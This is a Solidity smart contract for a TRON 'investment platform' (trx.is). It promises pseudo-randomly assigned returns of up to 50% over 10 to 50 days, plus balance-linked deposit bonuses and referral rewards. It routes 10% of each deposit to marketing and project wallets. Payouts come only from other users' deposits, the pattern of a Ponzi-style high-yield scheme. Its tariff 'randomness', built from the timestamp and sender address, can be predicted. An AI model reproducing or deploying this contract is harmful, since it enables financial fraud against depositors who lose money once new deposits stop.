//SourceUnit: trx.sol

/*
https://trx.is - decentralized investment platform based on TRON cryptocurrency.

email: admin@trx.is
telegram channel: @trxis
*/

pragma solidity 0.5.10;

contract TRXIS {
    struct Tariff {
        uint256 time;
        uint256 percent;
    }

    struct Deposit {
        uint256 tariff;
        uint256 amount;
        uint256 at;
    }

    struct Investor {
        bool registered;
        address referer;
        uint256 referrals_count;
        uint256 affiliateEarn;
        uint256 totalDepositedByRefs;
        Deposit[] deposits;
        uint256 invested;
        uint256 blockData;
        uint256 withdrawn;
    }

    uint256 DAY = 28800;
    uint256 MIN_DEPOSIT = 100000000;
    uint256 START_AT = 2762825;

    address payable private marketingAddress;
    address payable private projectAddress;

    Tariff[] public tariffs;
    uint256 public totalInvestors;
    uint256 public totalInvested;
    uint256 public totalRefRewards;
    mapping(address => Investor) public investors;

    event DepositAt(address user, uint256 tariff, uint256 amount);
    event Withdraw(address user, uint256 amount);

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function checkRandom() public view returns (uint256) {
        return random();
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function random() internal view returns (uint256) {
        uint256 randomnumber = uint256(
            keccak256(abi.encodePacked(now, msg.sender))
        ) % 999;
        randomnumber = randomnumber / 4 + 1;

        if (randomnumber > 0 && randomnumber <= 250) {
            return randomnumber;
        }
        if (randomnumber == 251) {
            return randomnumber - 250 + 1;
        }
        if (randomnumber == 0) {
            return randomnumber + 1;
        } else {
            randomnumber = randomnumber / 2;
            return randomnumber;
        }
    }

    function register(address referer) internal {
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            totalInvestors++;

            if (investors[referer].registered && referer != msg.sender) {
                investors[msg.sender].referer = referer;

                address rec = referer;
                for (uint256 i = 0; i < 1; i++) {
                    if (!investors[rec].registered) {
                        break;
                    }

                    if (i == 0) {
                        investors[rec].referrals_count++;
                    }
                    rec = investors[rec].referer;
                }
            }
        }
    }

    function getDepositBonus() external view returns (uint256){
      return getDepositBonusInternal();
    }

    function getDepositBonusInternal() internal view returns (uint256) {
        if (
            getContractBalance() >= 0 && getContractBalance() <= 4999999999999
        ) {
            return 0;
        }
        if (
            getContractBalance() >= 5000000000000 &&
            getContractBalance() <= 9999999999999
        ) {
            return 10;
        }
        if (
            getContractBalance() >= 10000000000000 &&
            getContractBalance() <= 24999999999999
        ) {
            return 20;
        }
        if (
            getContractBalance() >= 25000000000000 &&
            getContractBalance() <= 49999999999999
        ) {
            return 30;
        }
        if (
            getContractBalance() >= 50000000000000 &&
            getContractBalance() <= 74999999999999
        ) {
            return 40;
        }
        if (
            getContractBalance() >= 75000000000000 &&
            getContractBalance() <= 99999999999999
        ) {
            return 50;
        }
        if (
            getContractBalance() >= 100000000000000 &&
            getContractBalance() <= 249999999999999
        ) {
            return 60;
        }
        if (
            getContractBalance() >= 250000000000000 &&
            getContractBalance() <= 499999999999999
        ) {
            return 70;
        }
        if (
            getContractBalance() >= 500000000000000 &&
            getContractBalance() <= 749999999999999
        ) {
            return 80;
        }
        if (
            getContractBalance() >= 750000000000000 &&
            getContractBalance() <= 999999999999999
        ) {
            return 90;
        }
        if (getContractBalance() >= 1000000000000000) {
            return 100;
        }
    }

    function getReferralBonus() external view returns (uint256) {
      return getReferralBonusInternal();
    }

    function getReferralBonusInternal() internal view returns (uint256) {
        if (
            getContractBalance() >= 0 && getContractBalance() <= 4999999999999
        ) {
            return 5;
        }
        if (
            getContractBalance() >= 5000000000000 &&
            getContractBalance() <= 9999999999999
        ) {
            return 6;
        }
        if (
            getContractBalance() >= 10000000000000 &&
            getContractBalance() <= 24999999999999
        ) {
            return 7;
        }
        if (
            getContractBalance() >= 25000000000000 &&
            getContractBalance() <= 49999999999999
        ) {
            return 8;
        }
        if (
            getContractBalance() >= 50000000000000 &&
            getContractBalance() <= 74999999999999
        ) {
            return 9;
        }
        if (
            getContractBalance() >= 75000000000000 &&
            getContractBalance() <= 99999999999999
        ) {
            return 10;
        }
        if (
            getContractBalance() >= 100000000000000 &&
            getContractBalance() <= 249999999999999
        ) {
            return 11;
        }
        if (
            getContractBalance() >= 250000000000000 &&
            getContractBalance() <= 499999999999999
        ) {
            return 12;
        }
        if (
            getContractBalance() >= 500000000000000 &&
            getContractBalance() <= 749999999999999
        ) {
            return 13;
        }
        if (
            getContractBalance() >= 750000000000000 &&
            getContractBalance() <= 999999999999999
        ) {
            return 14;
        }
        if (getContractBalance() >= 1000000000000000) {
            return 15;
        }
    }

    function rewardReferers(uint256 amount, address referer) internal {
        address rec = referer;

        for (uint256 i = 0; i < 1; i++) {
            if (!investors[rec].registered) {
                break;
            }

            uint256 a = (amount * getReferralBonusInternal()) / 100;
            investors[rec].affiliateEarn += a;
            investors[rec].totalDepositedByRefs += amount;
            totalRefRewards += a;

            rec = investors[rec].referer;
        }
    }

    constructor(address payable marketingAddr, address payable projectAddr)
        public
    {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        //Tarrifs for 10 days 0-50
        tariffs.push(Tariff(10 * DAY, 1)); //0 This tariff cannot be used, but it is indicated just in case.
        tariffs.push(Tariff(10 * DAY, 1)); //1
        tariffs.push(Tariff(10 * DAY, 1)); //2
        tariffs.push(Tariff(10 * DAY, 1)); //3
        tariffs.push(Tariff(10 * DAY, 1)); //4
        tariffs.push(Tariff(10 * DAY, 1)); //5
        tariffs.push(Tariff(10 * DAY, 2)); //6
        tariffs.push(Tariff(10 * DAY, 2)); //7
        tariffs.push(Tariff(10 * DAY, 2)); //8
        tariffs.push(Tariff(10 * DAY, 2)); //9
        tariffs.push(Tariff(10 * DAY, 2)); //10
        tariffs.push(Tariff(10 * DAY, 3)); //11
        tariffs.push(Tariff(10 * DAY, 3)); //12
        tariffs.push(Tariff(10 * DAY, 3)); //13
        tariffs.push(Tariff(10 * DAY, 3)); //14
        tariffs.push(Tariff(10 * DAY, 3)); //15
        tariffs.push(Tariff(10 * DAY, 4)); //16
        tariffs.push(Tariff(10 * DAY, 4)); //17
        tariffs.push(Tariff(10 * DAY, 4)); //18
        tariffs.push(Tariff(10 * DAY, 4)); //19
        tariffs.push(Tariff(10 * DAY, 4)); //20
        tariffs.push(Tariff(10 * DAY, 5)); //21
        tariffs.push(Tariff(10 * DAY, 5)); //22
        tariffs.push(Tariff(10 * DAY, 5)); //23
        tariffs.push(Tariff(10 * DAY, 5)); //24
        tariffs.push(Tariff(10 * DAY, 5)); //25
        tariffs.push(Tariff(10 * DAY, 6)); //26
        tariffs.push(Tariff(10 * DAY, 6)); //27
        tariffs.push(Tariff(10 * DAY, 6)); //28
        tariffs.push(Tariff(10 * DAY, 6)); //29
        tariffs.push(Tariff(10 * DAY, 6)); //30
        tariffs.push(Tariff(10 * DAY, 7)); //31
        tariffs.push(Tariff(10 * DAY, 7)); //32
        tariffs.push(Tariff(10 * DAY, 7)); //33
        tariffs.push(Tariff(10 * DAY, 7)); //34
        tariffs.push(Tariff(10 * DAY, 7)); //35
        tariffs.push(Tariff(10 * DAY, 8)); //36
        tariffs.push(Tariff(10 * DAY, 8)); //37
        tariffs.push(Tariff(10 * DAY, 8)); //38
        tariffs.push(Tariff(10 * DAY, 8)); //39
        tariffs.push(Tariff(10 * DAY, 8)); //40
        tariffs.push(Tariff(10 * DAY, 9)); //41
        tariffs.push(Tariff(10 * DAY, 9)); //42
        tariffs.push(Tariff(10 * DAY, 9)); //43
        tariffs.push(Tariff(10 * DAY, 9)); //44
        tariffs.push(Tariff(10 * DAY, 9)); //45
        tariffs.push(Tariff(10 * DAY, 10)); //46
        tariffs.push(Tariff(10 * DAY, 10)); //47
        tariffs.push(Tariff(10 * DAY, 10)); //48
        tariffs.push(Tariff(10 * DAY, 10)); //49
        tariffs.push(Tariff(10 * DAY, 10)); //50
        //Tarrifs for 20 days 51-100
        tariffs.push(Tariff(20 * DAY, 11)); //51
        tariffs.push(Tariff(20 * DAY, 11)); //52
        tariffs.push(Tariff(20 * DAY, 11)); //53
        tariffs.push(Tariff(20 * DAY, 11)); //54
        tariffs.push(Tariff(20 * DAY, 11)); //55
        tariffs.push(Tariff(20 * DAY, 12)); //56
        tariffs.push(Tariff(20 * DAY, 12)); //57
        tariffs.push(Tariff(20 * DAY, 12)); //58
        tariffs.push(Tariff(20 * DAY, 12)); //59
        tariffs.push(Tariff(20 * DAY, 12)); //60
        tariffs.push(Tariff(20 * DAY, 13)); //61
        tariffs.push(Tariff(20 * DAY, 13)); //62
        tariffs.push(Tariff(20 * DAY, 13)); //63
        tariffs.push(Tariff(20 * DAY, 13)); //64
        tariffs.push(Tariff(20 * DAY, 13)); //65
        tariffs.push(Tariff(20 * DAY, 14)); //66
        tariffs.push(Tariff(20 * DAY, 14)); //67
        tariffs.push(Tariff(20 * DAY, 14)); //68
        tariffs.push(Tariff(20 * DAY, 14)); //69
        tariffs.push(Tariff(20 * DAY, 14)); //70
        tariffs.push(Tariff(20 * DAY, 15)); //71
        tariffs.push(Tariff(20 * DAY, 15)); //72
        tariffs.push(Tariff(20 * DAY, 15)); //73
        tariffs.push(Tariff(20 * DAY, 15)); //74
        tariffs.push(Tariff(20 * DAY, 15)); //75
        tariffs.push(Tariff(20 * DAY, 16)); //76
        tariffs.push(Tariff(20 * DAY, 16)); //77
        tariffs.push(Tariff(20 * DAY, 16)); //78
        tariffs.push(Tariff(20 * DAY, 16)); //79
        tariffs.push(Tariff(20 * DAY, 16)); //80
        tariffs.push(Tariff(20 * DAY, 17)); //81
        tariffs.push(Tariff(20 * DAY, 17)); //82
        tariffs.push(Tariff(20 * DAY, 17)); //83
        tariffs.push(Tariff(20 * DAY, 17)); //84
        tariffs.push(Tariff(20 * DAY, 17)); //85
        tariffs.push(Tariff(20 * DAY, 18)); //86
        tariffs.push(Tariff(20 * DAY, 18)); //87
        tariffs.push(Tariff(20 * DAY, 18)); //88
        tariffs.push(Tariff(20 * DAY, 18)); //89
        tariffs.push(Tariff(20 * DAY, 18)); //90
        tariffs.push(Tariff(20 * DAY, 19)); //91
        tariffs.push(Tariff(20 * DAY, 19)); //92
        tariffs.push(Tariff(20 * DAY, 19)); //93
        tariffs.push(Tariff(20 * DAY, 19)); //94
        tariffs.push(Tariff(20 * DAY, 19)); //95
        tariffs.push(Tariff(20 * DAY, 20)); //96
        tariffs.push(Tariff(20 * DAY, 20)); //97
        tariffs.push(Tariff(20 * DAY, 20)); //98
        tariffs.push(Tariff(20 * DAY, 20)); //99
        tariffs.push(Tariff(20 * DAY, 20)); //100
        //Tarrifs for 30 days 101-150
        tariffs.push(Tariff(30 * DAY, 21)); //101
        tariffs.push(Tariff(30 * DAY, 21)); //102
        tariffs.push(Tariff(30 * DAY, 21)); //103
        tariffs.push(Tariff(30 * DAY, 21)); //104
        tariffs.push(Tariff(30 * DAY, 21)); //105
        tariffs.push(Tariff(30 * DAY, 22)); //106
        tariffs.push(Tariff(30 * DAY, 22)); //107
        tariffs.push(Tariff(30 * DAY, 22)); //108
        tariffs.push(Tariff(30 * DAY, 22)); //109
        tariffs.push(Tariff(30 * DAY, 22)); //110
        tariffs.push(Tariff(30 * DAY, 23)); //111
        tariffs.push(Tariff(30 * DAY, 23)); //112
        tariffs.push(Tariff(30 * DAY, 23)); //113
        tariffs.push(Tariff(30 * DAY, 23)); //114
        tariffs.push(Tariff(30 * DAY, 23)); //115
        tariffs.push(Tariff(30 * DAY, 24)); //116
        tariffs.push(Tariff(30 * DAY, 24)); //117
        tariffs.push(Tariff(30 * DAY, 24)); //118
        tariffs.push(Tariff(30 * DAY, 24)); //119
        tariffs.push(Tariff(30 * DAY, 24)); //120
        tariffs.push(Tariff(30 * DAY, 25)); //121
        tariffs.push(Tariff(30 * DAY, 25)); //122
        tariffs.push(Tariff(30 * DAY, 25)); //123
        tariffs.push(Tariff(30 * DAY, 25)); //124
        tariffs.push(Tariff(30 * DAY, 25)); //125
        tariffs.push(Tariff(30 * DAY, 26)); //126
        tariffs.push(Tariff(30 * DAY, 26)); //127
        tariffs.push(Tariff(30 * DAY, 26)); //128
        tariffs.push(Tariff(30 * DAY, 26)); //129
        tariffs.push(Tariff(30 * DAY, 26)); //130
        tariffs.push(Tariff(30 * DAY, 27)); //131
        tariffs.push(Tariff(30 * DAY, 27)); //132
        tariffs.push(Tariff(30 * DAY, 27)); //133
        tariffs.push(Tariff(30 * DAY, 27)); //134
        tariffs.push(Tariff(30 * DAY, 27)); //135
        tariffs.push(Tariff(30 * DAY, 28)); //136
        tariffs.push(Tariff(30 * DAY, 28)); //137
        tariffs.push(Tariff(30 * DAY, 28)); //138
        tariffs.push(Tariff(30 * DAY, 28)); //139
        tariffs.push(Tariff(30 * DAY, 28)); //140
        tariffs.push(Tariff(30 * DAY, 29)); //141
        tariffs.push(Tariff(30 * DAY, 29)); //142
        tariffs.push(Tariff(30 * DAY, 29)); //143
        tariffs.push(Tariff(30 * DAY, 29)); //144
        tariffs.push(Tariff(30 * DAY, 29)); //145
        tariffs.push(Tariff(30 * DAY, 30)); //146
        tariffs.push(Tariff(30 * DAY, 30)); //147
        tariffs.push(Tariff(30 * DAY, 30)); //148
        tariffs.push(Tariff(30 * DAY, 30)); //149
        tariffs.push(Tariff(30 * DAY, 30)); //150
        //Tarrifs for 40 days 151-200
        tariffs.push(Tariff(40 * DAY, 31)); //151
        tariffs.push(Tariff(40 * DAY, 31)); //152
        tariffs.push(Tariff(40 * DAY, 31)); //153
        tariffs.push(Tariff(40 * DAY, 31)); //154
        tariffs.push(Tariff(40 * DAY, 31)); //155
        tariffs.push(Tariff(40 * DAY, 32)); //156
        tariffs.push(Tariff(40 * DAY, 32)); //157
        tariffs.push(Tariff(40 * DAY, 32)); //158
        tariffs.push(Tariff(40 * DAY, 32)); //159
        tariffs.push(Tariff(40 * DAY, 32)); //160
        tariffs.push(Tariff(40 * DAY, 33)); //161
        tariffs.push(Tariff(40 * DAY, 33)); //162
        tariffs.push(Tariff(40 * DAY, 33)); //163
        tariffs.push(Tariff(40 * DAY, 33)); //164
        tariffs.push(Tariff(40 * DAY, 33)); //165
        tariffs.push(Tariff(40 * DAY, 34)); //166
        tariffs.push(Tariff(40 * DAY, 34)); //167
        tariffs.push(Tariff(40 * DAY, 34)); //168
        tariffs.push(Tariff(40 * DAY, 34)); //169
        tariffs.push(Tariff(40 * DAY, 34)); //170
        tariffs.push(Tariff(40 * DAY, 35)); //171
        tariffs.push(Tariff(40 * DAY, 35)); //172
        tariffs.push(Tariff(40 * DAY, 35)); //173
        tariffs.push(Tariff(40 * DAY, 35)); //174
        tariffs.push(Tariff(40 * DAY, 35)); //175
        tariffs.push(Tariff(40 * DAY, 36)); //176
        tariffs.push(Tariff(40 * DAY, 36)); //177
        tariffs.push(Tariff(40 * DAY, 36)); //178
        tariffs.push(Tariff(40 * DAY, 36)); //179
        tariffs.push(Tariff(40 * DAY, 36)); //180
        tariffs.push(Tariff(40 * DAY, 37)); //181
        tariffs.push(Tariff(40 * DAY, 37)); //182
        tariffs.push(Tariff(40 * DAY, 37)); //183
        tariffs.push(Tariff(40 * DAY, 37)); //184
        tariffs.push(Tariff(40 * DAY, 37)); //185
        tariffs.push(Tariff(40 * DAY, 38)); //186
        tariffs.push(Tariff(40 * DAY, 38)); //187
        tariffs.push(Tariff(40 * DAY, 38)); //188
        tariffs.push(Tariff(40 * DAY, 38)); //189
        tariffs.push(Tariff(40 * DAY, 38)); //190
        tariffs.push(Tariff(40 * DAY, 39)); //191
        tariffs.push(Tariff(40 * DAY, 39)); //192
        tariffs.push(Tariff(40 * DAY, 39)); //193
        tariffs.push(Tariff(40 * DAY, 39)); //194
        tariffs.push(Tariff(40 * DAY, 39)); //195
        tariffs.push(Tariff(40 * DAY, 40)); //196
        tariffs.push(Tariff(40 * DAY, 40)); //197
        tariffs.push(Tariff(40 * DAY, 40)); //198
        tariffs.push(Tariff(40 * DAY, 40)); //199
        tariffs.push(Tariff(40 * DAY, 40)); //200
        //Tarrifs for 50 days 201-250
        tariffs.push(Tariff(50 * DAY, 41)); //201
        tariffs.push(Tariff(50 * DAY, 41)); //202
        tariffs.push(Tariff(50 * DAY, 41)); //203
        tariffs.push(Tariff(50 * DAY, 41)); //204
        tariffs.push(Tariff(50 * DAY, 41)); //205
        tariffs.push(Tariff(50 * DAY, 42)); //206
        tariffs.push(Tariff(50 * DAY, 42)); //207
        tariffs.push(Tariff(50 * DAY, 42)); //208
        tariffs.push(Tariff(50 * DAY, 42)); //209
        tariffs.push(Tariff(50 * DAY, 42)); //210
        tariffs.push(Tariff(50 * DAY, 43)); //211
        tariffs.push(Tariff(50 * DAY, 43)); //212
        tariffs.push(Tariff(50 * DAY, 43)); //213
        tariffs.push(Tariff(50 * DAY, 43)); //214
        tariffs.push(Tariff(50 * DAY, 43)); //215
        tariffs.push(Tariff(50 * DAY, 44)); //216
        tariffs.push(Tariff(50 * DAY, 44)); //217
        tariffs.push(Tariff(50 * DAY, 44)); //218
        tariffs.push(Tariff(50 * DAY, 44)); //219
        tariffs.push(Tariff(50 * DAY, 44)); //220
        tariffs.push(Tariff(50 * DAY, 45)); //221
        tariffs.push(Tariff(50 * DAY, 45)); //222
        tariffs.push(Tariff(50 * DAY, 45)); //223
        tariffs.push(Tariff(50 * DAY, 45)); //224
        tariffs.push(Tariff(50 * DAY, 45)); //225
        tariffs.push(Tariff(50 * DAY, 46)); //226
        tariffs.push(Tariff(50 * DAY, 46)); //227
        tariffs.push(Tariff(50 * DAY, 46)); //228
        tariffs.push(Tariff(50 * DAY, 46)); //229
        tariffs.push(Tariff(50 * DAY, 46)); //230
        tariffs.push(Tariff(50 * DAY, 47)); //231
        tariffs.push(Tariff(50 * DAY, 47)); //232
        tariffs.push(Tariff(50 * DAY, 47)); //233
        tariffs.push(Tariff(50 * DAY, 47)); //234
        tariffs.push(Tariff(50 * DAY, 47)); //235
        tariffs.push(Tariff(50 * DAY, 48)); //236
        tariffs.push(Tariff(50 * DAY, 48)); //237
        tariffs.push(Tariff(50 * DAY, 48)); //238
        tariffs.push(Tariff(50 * DAY, 48)); //239
        tariffs.push(Tariff(50 * DAY, 48)); //240
        tariffs.push(Tariff(50 * DAY, 49)); //241
        tariffs.push(Tariff(50 * DAY, 49)); //242
        tariffs.push(Tariff(50 * DAY, 49)); //243
        tariffs.push(Tariff(50 * DAY, 49)); //244
        tariffs.push(Tariff(50 * DAY, 49)); //245
        tariffs.push(Tariff(50 * DAY, 50)); //246
        tariffs.push(Tariff(50 * DAY, 50)); //247
        tariffs.push(Tariff(50 * DAY, 50)); //248
        tariffs.push(Tariff(50 * DAY, 50)); //249
        tariffs.push(Tariff(50 * DAY, 50)); //250
    }

    function deposit(address referer) external payable {
        uint256 tariff = random();
        require(block.number >= START_AT);
        require(msg.value >= MIN_DEPOSIT);
        require(tariff < tariffs.length);

        register(referer);
        projectAddress.transfer((msg.value * 2) / 100);
        marketingAddress.transfer((msg.value * 8) / 100);
        rewardReferers(msg.value, investors[msg.sender].referer);
        uint256 bonus = (msg.value / 100) * getDepositBonusInternal();
        uint256 depWithBonus = msg.value + bonus;
        investors[msg.sender].invested += depWithBonus;
        totalInvested += msg.value;
        
        investors[msg.sender].deposits.push(
            Deposit(tariff, depWithBonus, block.number)
        );

        if (investors[msg.sender].blockData == 0) {
            investors[msg.sender].blockData = block.number;
        }

        emit DepositAt(msg.sender, tariff, depWithBonus);
    }

    function withdrawable(address user) public view returns (uint256 amount) {
        Investor storage investor = investors[user];

        for (uint256 i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];
            Tariff storage tariff = tariffs[dep.tariff];

            uint256 finish = dep.at + tariff.time;
            uint256 since = investor.blockData > dep.at
                ? investor.blockData
                : dep.at;
            uint256 till = block.number > finish ? finish : block.number;
            
            uint256 depDay = (dep.amount * (till - since)) / tariff.time;
            if (since < till) {
                amount +=
                    (dep.amount * (till - since) * tariff.percent) /
                    tariff.time /
                    100 +
                    depDay;
            }
        }
    }

    function profit() internal returns (uint256) {
        Investor storage investor = investors[msg.sender];

        uint256 amount = withdrawable(msg.sender);

        amount += investor.affiliateEarn;
        investor.affiliateEarn = 0;

        investor.blockData = block.number;

        return amount;
    }

    function withdraw() external {
        uint256 amount = profit();
        msg.sender.transfer(amount);
        investors[msg.sender].withdrawn += amount;

        emit Withdraw(msg.sender, amount);
    }
}